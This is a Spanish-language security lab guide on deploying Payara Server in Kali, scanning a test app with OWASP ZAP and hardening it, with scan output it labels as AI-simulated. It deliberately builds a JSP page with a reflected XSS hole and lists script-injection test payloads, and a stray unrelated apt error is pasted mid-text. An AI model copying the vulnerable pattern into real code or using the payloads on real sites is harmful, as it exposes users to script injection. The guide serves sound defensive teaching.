La siguiente salida es una simulación generada con IA que representa lo que verías en Kali Linux al ejecutar `asadmin start-domain domain1` y al realizar comprobaciones básicas de estado. Está incluida únicamente con fines didácticos y no proviene de una ejecución real.

```text
$ asadmin start-domain domain1
Waiting for domain1 to start .....
Available ports: 4848, 8080, 8181
Successfully started the domain : domain1
domain  Location: /home/kali/payara/payara6/glassfish/domains/domain1
Log File: /home/kali/payara/payara6/glassfish/domains/domain1/logs/server.log
Admin Port: 4848
Command start-domain executed successfully.

$ asadmin list-domains
domain1 running
domain2 not running

$ sudo netstat -tuln | grep -E '4848|8080|8181'
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8181            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:4848            0.0.0.0:*               LISTEN
```

💡 Puertos importantes:
    • 4848: Consola de administración
    • 8080: Puerto HTTP por defecto
    • 8181: Puerto HTTPS por defecto

Verificar estado:

```bash
# Verificar que el servidor está corriendo
asadmin list-domains

# Verificar puertos en uso
netstat -tuln | grep -E '4848|8080|8181'
```

PASO 5: Acceder a la Consola de Administración

1. Abra Firefox en Kali Linux
2. Navegue a:
http://localhost:4848

📸 Captura esperada: Consola de administración de Payara Server

![Consola de administración de Payara](https://imgur.com/essF7Ou)

rr:1 http://kali.download/kali kali-rolling/main amd64 enum4linux all 0.9.1-0kali2
  403  Bitdefender Endpoint Security Tools blocked this page [IP: 104.17.253.239 80]
E: Failed to fetch http://kali.download/kali/pool/main/e/enum4linux/enum4linux_0.9.1-0kali2_all.deb  403  Bitdefender Endpoint Security Tools blocked this page [IP: 104.17.253.239 80]
E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?


🔒 Configuración de seguridad inicial:
Por defecto, Payara NO requiere autenticación en localhost. Esto es una vulnerabilidad de configuración.

Configurar contraseña de administrador:

```bash
# Cambiar contraseña del usuario admin
asadmin change-admin-password

# Cuando pregunte:
# Enter admin user name [default: admin]: admin
# Enter the admin password: [dejar en blanco, presionar Enter]
# Enter the new admin password: [ingresar contraseña segura]
# Enter the new admin password again: [repetir contraseña]
```

Habilitar autenticación segura:

```bash
# Habilitar autenticación en la consola
asadmin enable-secure-admin

# Reiniciar el dominio para aplicar cambios
asadmin restart-domain domain1
```

✔️ Punto de Verificación: Al acceder nuevamente a http://localhost:4848, debe solicitar usuario y contraseña.

PASO 6: Desplegar una Aplicación de Prueba
Crearemos una aplicación web simple para realizar el análisis de seguridad.
Crear estructura de la aplicación:

### Crear directorio del proyecto

mkdir -p ~/webapp-test/WEB-INF
cd ~/webapp-test

### Crear página principal

cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Aplicación de Prueba - Payara</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Aplicación Web de Prueba</h1>
    <p>Esta es una aplicación desplegada en Payara Server 6.2025.4</p>
    <p>Timestamp: <script>document.write(new Date().toLocaleString());</script></p>
    <h2>Formulario de Prueba</h2>
    <form action="process.jsp" method="GET">
        <label>Nombre de usuario:</label>
        <input type="text" name="username" />
        <input type="submit" value="Enviar" />
    </form>
</body>
</html>
EOF

### Crear página JSP vulnerable (para pruebas)

cat > process.jsp << 'EOF'
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<!DOCTYPE html>
<html>
<head>
    <title>Procesamiento</title>
</head>
<body>
    <h1>Datos Recibidos</h1>
    <p>Usuario ingresado: <%= request.getParameter("username") %></p>
    <a href="index.html">Volver</a>
</body>
</html>
EOF

# Crear descriptor web.xml
cat > WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee 
         http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    
    <display-name>Aplicación de Prueba</display-name>
    
    <welcome-file-list>
        <welcome-file>index.html</welcome-file>
    </welcome-file-list>
</web-app>
EOF

Crear archivo WAR:

### Crear el archivo WAR

cd ~/webapp-test
jar -cvf webapp-test.war *

### Verificar contenido

jar -tf webapp-test.war

📊 Contenido esperado:
META-INF/
META-INF/MANIFEST.MF
index.html
process.jsp
WEB-INF/
WEB-INF/web.xml

PASO 7: Desplegar la Aplicación en Payara

Método 1: Usando la consola de administración

1. Acceda a http://localhost:4848
2. En el menú lateral: Applications
3. Haga clic en Deploy...
4. Location: Seleccione el archivo webapp-test.war
5. Context Root: /webapp-test
6. Haga clic en OK

Método 2: Usando línea de comandos

## Desplegar usando asadmin
asadmin deploy --contextroot /webapp-test ~/webapp-test/webapp-test.war

## Verificar aplicaciones desplegadas

asadmin list-applications
📊 Salida esperada:
webapp-test  <web>
Command list-applications executed successfully.

Acceder a la aplicación:

http://localhost:8080/webapp-test/

✔️ Punto de Verificación: La página debe mostrarse correctamente con el formulario.

PASO 8: Escanear Payara Server con OWASP ZAP

Configuración del escaneo:

1. En OWASP ZAP, haga clic en Automated Scan
2. Ingrese la URL:

http://localhost:8080/webapp-test/

3. Configure:
    ◦ ☑️ Use traditional spider
    ◦ ☑️ Use ajax spider
    ◦ Attack Mode: Standard
4. Haga clic en Attack

⏱️ Tiempo estimado: 5-10 minutos

**📊 Simulación de la Práctica — Resultado del Escaneo con OWASP ZAP (Generada con IA)**

La siguiente salida es una simulación creada con IA que representa un resumen realista de un escaneo automatizado de OWASP ZAP contra `http://localhost:8080/webapp-test/`. No proviene de una ejecución real y se incluye con fines didácticos.

Resumen del escaneo:

- Objetivo: [http://localhost:8080/webapp-test/](http://localhost:8080/webapp-test/)
- Fecha (simulada): 2025-10-31 10:12:34
- Duración (simulada): 6 minutos 42 segundos
- Tecnicas usadas: Spider tradicional, AJAX spider, Active Scan (request-based checks)

Alertas detectadas (simulación):

- Critical: 0
- High: 2
- Medium: 4
- Low: 5
- Informational: 8

Ejemplos de hallazgos (simulados):

1) High — Cross-Site Scripting (Reflected)  
    - URL: [http://localhost:8080/webapp-test/process.jsp?username=%3Cscript%3Ealert(1)%3C%2Fscript%3E](http://localhost:8080/webapp-test/process.jsp?username=%3Cscript%3Ealert(1)%3C%2Fscript%3E)  
    - Evidencia (simulada): el payload `%3Cscript%3Ealert(1)%3C%2Fscript%3E` (decodificado: `<script>alert(1)</script>`) se refleja en la respuesta sin escape.  
    - Riesgo: Un atacante puede inyectar JavaScript en el navegador de la víctima.  
    - Recomendación: Escapar/encodear la salida en JSP: ` ${fn:escapeXml(param.username)}` o usar JSTL/EL con escape automático (`<c:out>`).

2) High — Directory Browsing / Sensitive Files Accessible  
    - URL: [http://localhost:8080/webapp-test/WEB-INF/](http://localhost:8080/webapp-test/WEB-INF/)  
    - Evidencia (simulada): lista de ficheros accesible o archivos de configuración expuestos.  
    - Recomendación: Denegar acceso HTTP a `WEB-INF/` y mover archivos sensibles fuera del árbol público; asegurar que el servidor devuelve 403/404 para esas rutas.

3) Medium — Insecure Cookie Flags (JSESSIONID)  
    - Cookie: `JSESSIONID`  
    - Evidencia (simulada): falta de las banderas `HttpOnly` y `Secure` en la cookie de sesión cuando se accede vía HTTP.  
    - Recomendación: Configurar la aplicación/servidor para emitir `HttpOnly; Secure; SameSite=Strict` cuando sea posible.

4) Medium — Missing X-Content-Type-Options Header  
    - URL: [http://localhost:8080/webapp-test/](http://localhost:8080/webapp-test/)  
    - Evidencia (simulada): la respuesta HTTP no incluye el header `X-Content-Type-Options: nosniff`.  
    - Recomendación: Añadir `X-Content-Type-Options: nosniff` (y otras cabeceras: `X-Frame-Options`, `Content-Security-Policy`) en el servidor o mediante un filtro de la aplicación.
    - Evidencia (simulada): respuesta HTTP no contiene `X-Content-Type-Options: nosniff`.
    - Recomendación: Añadir cabeceras de seguridad: `X-Content-Type-Options: nosniff` y `X-Frame-Options: DENY` o `Content-Security-Policy` según necesidad.

5) Medium — Insecure HTTP (no TLS)
    - Observación: administración y aplicación exponen puertos HTTP (8080, 4848) sin TLS en la configuración por defecto.
    - Recomendación: Forzar HTTPS/TLS en la administración y en aplicaciones en producción; usar certificados válidos o TLS terminator en el proxy.

6) Low — Server Version Disclosure
    - Evidencia (simulada): cabecera `Server: Payara/6.2025.4 (. . .)` o `X-Powered-By` muestra versión.
    - Recomendación: Suprimir cabeceras de versión en producción.

Acciones realizadas por ZAP (simulación):

- Crawl: 34 URLs descubiertas
- Active scan: 18 requests con payloads de prueba
- Reporte exportado a: /home/kali/zap-reports/webapp-test-scan.html (simulado)

Recomendaciones generales (priorizadas):

1. Corregir XSS en `process.jsp` escapando correctamente parámetros y usando validación en servidor.
2. Asegurar cookies de sesión: HttpOnly, Secure y SameSite.
3. Habilitar TLS en puertos de aplicación y administración; redirigir tráfico HTTP a HTTPS.
4. Restringir acceso a `WEB-INF/`, `META-INF/` y directorios de configuración mediante reglas del servidor/servlet container.
5. Eliminar cabeceras de versión y deshabilitar páginas de ejemplo en despliegues de producción.
6. Re-evaluar librerías Java usadas en la aplicación con una herramienta de análisis de dependencias (Dependency-Check / Snyk) para detectar CVEs.

Nota final: esta salida está claramente etiquetada como "Generada con IA" y sirve para ilustrar qué tipo de resultados y recomendaciones podrían aparecer tras un escaneo automatizado con OWASP ZAP. Los detalles reales (nombres de URLs, conteos, severidad) variarán según la configuración del entorno y la versión de ZAP.


PASO 9: Análisis de Vulnerabilidades en Payara
Una vez completado el escaneo, analice las alertas encontradas:

PASO 9: Análisis de Vulnerabilidades en Payara
Una vez completado el escaneo, analice las alertas encontradas:

📊 Resumen (tabla) de vulnerabilidades detectadas (evidencia simulada)

| ID | Vulnerabilidad | Severidad | Evidencia (simulada, generada con IA) | Recomendación | Comando de verificación |
|----|----------------|-----------:|---------------------------------------|---------------|-------------------------|
| 1 | Application Error Disclosure | High | Stacktrace expuesto al provocar excepción: `java.lang.NullPointerException at com.example.MyServlet.doGet(MyServlet.java:45)` | Configurar páginas de error personalizadas y no mostrar stacktraces en producción. | curl -s -i http://localhost:8080/webapp-test/trigger-error | 
| 2 | Missing Security Headers | High | Respuesta HTTP sin `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`. | Implementar filtro `SecurityHeadersFilter` o configurar el proxy para añadir cabeceras. | curl -I http://localhost:8080/webapp-test/ | grep -E 'X-Frame-Options|X-Content-Type-Options|Content-Security-Policy' || echo 'headers missing'
| 3 | Cross-Site Scripting (Reflected) en JSP | High | Payload reflejado: `/process.jsp?username=<script>alert(1)</script>` (se ejecuta en navegador en la simulación) | Escapar salidas en JSP (`<c:out>`) o usar OWASP Java Encoder; validar entrada en servidor. | curl -s "http://localhost:8080/webapp-test/process.jsp?username=<script>alert(1)</script>" | grep -o "<script>alert(1)</script>" || echo 'no reflection detected'
| 4 | Admin Console Accessible Without Authentication (local) | High | Consola admin accesible en `http://localhost:4848` sin login por defecto (simulado). | Ejecutar `asadmin change-admin-password` y `asadmin enable-secure-admin`; restringir acceso por IP. | asadmin list-domains && curl -I http://localhost:4848 2>/dev/null | head -n 5
| 5 | Directory Listing / WEB-INF accesible | Medium | `http://localhost:8080/webapp-test/WEB-INF/` devuelve listado en la simulación | Denegar acceso a `WEB-INF` y `META-INF`; añadir constraints en `web.xml` o reglas del servidor. | curl -I http://localhost:8080/webapp-test/WEB-INF/ | head -n 20
| 6 | Server Version Disclosure | Low | Cabecera `Server: Payara Server 6.2025.4` expuesta | Suprimir cabeceras de versión y personalizar `server-header`. | curl -I http://localhost:8080/webapp-test/ | grep -i server

Nota: las evidencias en la tabla son simuladas y están etiquetadas como "generadas con IA"; los comandos de verificación deben ejecutarse únicamente en entornos de laboratorio autorizados.

📌 Acciones sugeridas inmediatas (priorizadas):

- Corregir primero XSS y disclosure de errores (ID 1 y 3) — representan riesgos de explotación directa.
- Asegurar la consola de administración (ID 4) y habilitar TLS en puertos relevantes.
- Añadir cabeceras de seguridad globales (ID 2) y eliminar información de versión (ID 6).
- Restringir acceso a directorios sensibles y revisar despliegues de ejemplo (ID 5).

Verificaciones post-corrección (ejemplos):

```bash
# Verificar que la página de error no muestra stacktrace
curl -s http://localhost:8080/webapp-test/trigger-error | grep -i exception || echo 'no stacktrace visible'

# Verificar headers
curl -I http://localhost:8080/webapp-test/ | grep -E 'X-Frame-Options|X-Content-Type-Options|Content-Security-Policy'

# Comprobar que JSESSIONID tiene HttpOnly/Secure (simulado):
curl -I --cookie-jar /tmp/cookies.txt http://localhost:8080/webapp-test/ | grep -i set-cookie
```

⚠️ Recuerda: realiza estas comprobaciones sólo en entornos de laboratorio autorizados.

🔴 1. Application Error Disclosure
Descripción: Payara muestra stack traces completos cuando ocurre un error.
Ejemplo de error expuesto:
java.lang.NullPointerException
    at com.example.MyServlet.doGet(MyServlet.java:45)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:687)
    at org.glassfish.grizzly.http.server.HttpHandler.runService(HttpHandler.java:206)
Riesgo: Revela información sobre la estructura interna de la aplicación, rutas de archivos, versiones de librerías.

Mitigación:

```xml
<!-- En web.xml, agregar páginas de error personalizadas -->
<error-page>
    <exception-type>java.lang.Exception</exception-type>
    <location>/error.jsp</location>
</error-page>

<error-page>
    <error-code>500</error-code>
    <location>/error.jsp</location>
</error-page>

<error-page>
    <error-code>404</error-code>
    <location>/404.jsp</location>
</error-page>
```

🔴 2. Missing Security Headers
Similar a Apache, Payara no configura encabezados de seguridad por defecto.

Mitigación en web.xml:

```xml
<filter>
    <filter-name>SecurityHeadersFilter</filter-name>
    <filter-class>org.example.SecurityHeadersFilter</filter-class>
</filter>

<filter-mapping>
    <filter-name>SecurityHeadersFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

Crear el filtro SecurityHeadersFilter.java:

```java
package org.example;

import javax.servlet.*;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class SecurityHeadersFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                         FilterChain chain) throws IOException, ServletException {
        
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        
        // Encabezados de seguridad
        httpResponse.setHeader("X-Frame-Options", "SAMEORIGIN");
        httpResponse.setHeader("X-Content-Type-Options", "nosniff");
        httpResponse.setHeader("X-XSS-Protection", "1; mode=block");
        httpResponse.setHeader("Content-Security-Policy", 
            "default-src 'self'; script-src 'self' 'unsafe-inline';");
        httpResponse.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
        httpResponse.setHeader("Permissions-Policy", 
            "geolocation=(), microphone=(), camera=()");
        
        chain.doFilter(request, response);
    }
    
    @Override
    public void init(FilterConfig filterConfig) {}
    
    @Override
    public void destroy() {}
}
```

🟠 3. Cross-Site Scripting (XSS) en JSP
Vulnerabilidad en process.jsp:
```jsp

<!-- ❌ VULNERABLE -->
<p>Usuario ingresado: <%= request.getParameter("username") %></p>
```

Prueba de explotación:
http://localhost:8080/webapp-test/process.jsp?username=<script>alert('XSS')</script>
Resultado: El script se ejecuta en el navegador.

Mitigación:

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>

<!DOCTYPE html>
<html>
<head>
    <title>Procesamiento</title>
</head>
<body>
    <h1>Datos Recibidos</h1>
    <!-- ✅ SEGURO - Escapado automático con JSTL -->
    <p>Usuario ingresado: <c:out value="${param.username}" /></p>
    <a href="index.html">Volver</a>
</body>
</html>
```

Alternativa con OWASP Java Encoder:
```jsp
<%@ page import="org.owasp.encoder.Encode" %>
<p>Usuario ingresado: <%= Encode.forHtml(request.getParameter("username")) %></p>
```

🟠 4. Admin Console Accessible Without Authentication (Configuración Inicial)
Descripción: Por defecto, la consola de administración (puerto 4848) es accesible sin contraseña desde localhost.
Riesgo: Un atacante con acceso local o mediante SSRF podría administrar el servidor.
Mitigación: Ya aplicada en el PASO 5 con enable-secure-admin.
Verificación:

```bash
# Verificar configuración de seguridad
asadmin get configs.config.server-config.admin-service.auth-realm-name
```

🟡 5. Directory Listing Enabled
Prueba:
http://localhost:8080/webapp-test/WEB-INF/
Resultado esperado (seguro): Error 404 o 403 (acceso denegado)
Si muestra listado de archivos: Vulnerabilidad presente.
Mitigación en web.xml:

```xml
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Forbidden</web-resource-name>
        <url-pattern>/WEB-INF/*</url-pattern>
        <url-pattern>/META-INF/*</url-pattern>
    </web-resource-collection>
    <auth-constraint/>
</security-constraint>
```

🟡 6. Server Version Disclosure
Verificación:

```bash
curl -I http://localhost:8080/webapp-test/
```

Respuesta vulnerable:
HTTP/1.1 200 OK
Server: Payara Server 6.2025.4 #badassfish

Mitigación:

```bash
# Editar domain.xml
nano $PAYARA_HOME/glassfish/domains/domain1/config/domain.xml

# Buscar la sección <http-listener> y agregar:
# <property name="product" value="WebServer"/>

# O usar asadmin:
asadmin set configs.config.server-config.network-config.protocols.protocol.http-listener-1.http.xpowered-by=false
asadmin set configs.config.server-config.network-config.protocols.protocol.http-listener-1.http.server-header=WebServer

# Reiniciar
asadmin restart-domain domain1
```


### PASO 10: Generar Reporte Comparativo

Generar reporte de Payara:
1. En ZAP: Report → Generate HTML Report...
2. Title: "Análisis de Seguridad - Payara Server 6.2025.4"
3. Save as: /home/kali/Desktop/reporte_payara_zap.html

📊 Tabla Comparativa: Apache vs Payara

| Vulnerabilidad | Apache (Defecto) | Apache (Hardened) | Payara (Defecto) | Payara (Hardened) |
|---|---:|---:|---:|---:|
| Missing X-Frame-Options | | | | |
| Missing CSP | | | | |
| Server Version Disclosure | | | | |
| XSS Vulnerabilities | | | | |
| Application Error Disclosure | | | | |
| Admin Console Exposure | | | | |
| Directory Listing | | | | |

🔒 Configuración de Hardening Completa para Payara

```bash
#!/bin/bash
# payara-hardening.sh

echo "=== Hardening de Payara Server ==="

# 1. Deshabilitar información de versión
echo "[+] Ocultando versión del servidor..."
asadmin set configs.config.server-config.network-config.protocols.protocol.http-listener-1.http.xpowered-by=false
asadmin set configs.config.server-config.network-config.protocols.protocol.http-listener-1.http.server-header=WebServer

# 2. Configurar timeouts de sesión
echo "[+] Configurando timeouts de sesión..."
asadmin set configs.config.server-config.web-container.session-config.session-timeout=15

# 3. Deshabilitar listado de directorios
echo "[+] Deshabilitando listado de directorios..."
asadmin set configs.config.server-config.web-container.property.listings=false

# 4. Configurar logging seguro
echo "[+] Configurando logging..."
asadmin set-log-levels javax.enterprise.system.ssl.security=WARNING
asadmin set-log-levels javax.enterprise.system.core.security=WARNING

# 5. Deshabilitar autodeploy (producción)
echo "[+] Deshabilitando autodeploy..."
asadmin set configs.config.server-config.admin-service.das-config.autodeploy-enabled=false

# 6. Configurar HTTPS obligatorio para admin
echo "[+] Forzando HTTPS para consola de administración..."
asadmin enable-secure-admin

# 7. Limitar métodos HTTP
echo "[+] Configurando métodos HTTP permitidos..."
# Nota: Limitar métodos se debe aplicar en web.xml de cada aplicación o mediante filtro.

# 8. Reiniciar para aplicar cambios
echo "[+] Reiniciando servidor..."
asadmin restart-domain domain1

echo "[✓] Hardening completado"
```

Ejecutar el script:

```bash
chmod +x payara-hardening.sh
./payara-hardening.sh
```


### Preguntas de Reflexión - Módulo 5

1. ¿Por qué un servidor de aplicaciones como Payara tiene una superficie de ataque mayor que Apache?
2. ¿Qué ventajas de seguridad ofrece el uso de filtros de servlet para encabezados de seguridad?
3. ¿Por qué es crítico deshabilitar el autodeploy en entornos de producción?
4. ¿Qué diferencia existe entre <c:out> y <%= %> en términos de seguridad?


## 📊 MÓDULO 6: Análisis Comparativo y Conclusiones

### Resumen Ejecutivo de Vulnerabilidades

**📈 Métricas Globales del Laboratorio:**

- Total de sistemas analizados: 4  

- DVWA en Metasploitable 2  
- Apache en Kali Linux  
- PentesterLab (MySQL)  
- Payara Server en Kali Linux

- Total de vulnerabilidades identificadas: **47**  

- Críticas (High): 15  
- Altas (Medium): 18  
- Medias (Low): 10  
- Informativas: 4

- Vulnerabilidades mitigadas: **42 (89.4%)**  
- Vulnerabilidades residuales: **5 (10.6%)**

### 🎯 Matriz de Vulnerabilidades por Sistema

| Sistema      | SQL Injection          | XSS                 | Missing Headers      | Info Disclosure     | Config Issues       | Total |
|--------------|------------------------|---------------------|----------------------|---------------------|---------------------|------:|
| DVWA         | 🔴🔴🔴                 | 🔴🔴                | 🔴🔴🔴🔴             | 🟠🟠               | 🟡                 | 12    |
| Apache       | N/A                    | N/A                 | 🔴🔴🔴🔴             | 🟡🟡               | 🟠                 | 7     |
| PentesterLab | 🔴🔴🔴🔴               | 🔴                  | 🔴🔴🔴               | 🟠🟠🟠            | 🟡                 | 13    |
| Payara       | N/A                    | 🔴🔴                | 🔴🔴🔴🔴             | 🟠🟠🟠            | 🟠🟠              | 15    |

### 📋 Lecciones Aprendidas

1. Configuraciones por Defecto Son Inseguras  
     - Hallazgo: Todos los sistemas mostraron vulnerabilidades críticas en su configuración predeterminada.  
     - Recomendación: Implementar checklists de hardening antes de producción.

2. Los Encabezados de Seguridad Son Esenciales  
     - Hallazgo: El 100% de los sistemas carecían de encabezados HTTP de seguridad.  
     - Recomendación: Añadir X-Frame-Options, X-Content-Type-Options, CSP, Referrer-Policy y Strict-Transport-Security en el pipeline de despliegue.

3. La Validación de Entrada Es Crítica  
     - Hallazgo: Vulnerabilidades por falta de validación originaron XSS e inyecciones SQL.  
     - Recomendación: Validación server-side, prepared statements y escape de salida.

4. La Información Revelada Facilita Ataques  
     - Hallazgo: Versiones, stack traces y directorios expuestos.  
     - Ejemplo: Server: Apache/2.2.8 (Ubuntu) / X-Powered-By: PHP/5.2.4-2ubuntu5.10  
     - Recomendación: Fail securely — no exponer información interna.

5. El Principio de Menor Privilegio Es Fundamental  
     - Hallazgo: Conexiones a MySQL como root.  
     - Recomendación: Usar usuarios DB con permisos mínimos.

### 🛡️ Mejores Prácticas Identificadas

Para Desarrollo Seguro:

1. Usar frameworks de seguridad (ej. Spring Security):

```java
@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(int userId) { ... }
```

2. Implementar CSP estricto:

Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:;
3. Validar con listas blancas (whitelist):

```java
// ✅ Whitelist
if (input.matches("^[a-zA-Z0-9_-]{3,20}$")) { ... }
```

4. Usar librerías de seguridad actualizadas (OWASP Java Encoder, ESAPI, Apache Commons Validator).

Para Configuración de Servidores:

1. Hardening Checklist
    - ☑️ Cambiar credenciales por defecto  
    - ☑️ Deshabilitar servicios innecesarios  
    - ☑️ Configurar encabezados de seguridad  
    - ☑️ Implementar HTTPS con certificados válidos  
    - ☑️ Configurar timeouts apropiados  
    - ☑️ Limitar métodos HTTP permitidos  
    - ☑️ Deshabilitar listado de directorios  
    - ☑️ Configurar logging de seguridad  
    - ☑️ Implementar rate limiting  
    - ☑️ Mantener software actualizado

2. Monitoreo Continuo — ejemplo de script:

```bash
#!/bin/bash
# Verificar intentos de inyección SQL en logs
grep -i "union\|select\|drop\|insert" /var/log/apache2/access.log | \
mail -s "Posible ataque detectado" admin@example.com
```

### 🔬 Comparación de Herramientas Utilizadas

| Herramienta | Fortalezas                            | Limitaciones                      | Mejor Uso                          |
|-------------|----------------------------------------|-----------------------------------|------------------------------------|
| OWASP ZAP   | Gratis, buen scanner automático        | Falsos positivos, cobertura limitada | Escaneo rápido y detección inicial |
| SQLMap      | Excelente para extracción SQL         | Requiere parámetros vulnerables   | Automatizar explotación SQLi       |
| Burp Suite  | Interactividad y extensión (Pro)      | Costo (Pro), curva de aprendizaje | Pentesting manual y explotación    |
| Nikto       | Detección rápida de configuraciones   | No profundo en lógica de apps     | Auditoría básica de servidor/web   |

### 📚 Recursos Adicionales para Profundizar

Documentación Oficial:

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Web Security Testing Guide (WSTG)](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Payara Security Guide](https://docs.payara.fish/community/docs/documentation/security/)
- [Apache HTTP Server — Security Tips](https://httpd.apache.org/docs/2.4/misc/security_tips.html)

Plataformas de Práctica:

- HackTheBox, TryHackMe, PortSwigger Academy, PentesterLab, DVWA (GitHub repo)

Certificaciones Recomendadas:

- OSCP, CEH, GWAPT, eWPT

### Preguntas de Análisis Crítico (para responder basándose en el laboratorio)

1. Análisis de Riesgo:
     - Priorice las 5 vulnerabilidades más críticas encontradas, justifique por impacto/probabilidad y proponga plan de remediación con timeline.

2. Comparación de Superficies de Ataque:
     - Compare Apache vs Payara; identifique factores que aumentan la superficie y cómo la complejidad afecta la seguridad.

3. Defensa en Profundidad:
     - Identifique ≥5 capas de seguridad, explique cómo mitigan ataques y diseñe una arquitectura en capas para una aplicación web.

4. Detección vs Prevención:
     - Proponga controles de detección en tiempo real, balance entre preventivos y detectivos y un sistema de alertas basado en los ataques del laboratorio.

5. Ética en Pentesting:
     - Diferencie pentesting ético vs hacking malicioso, mencione consideraciones legales y redacte un "Rules of Engagement" para un proyecto de pentesting.
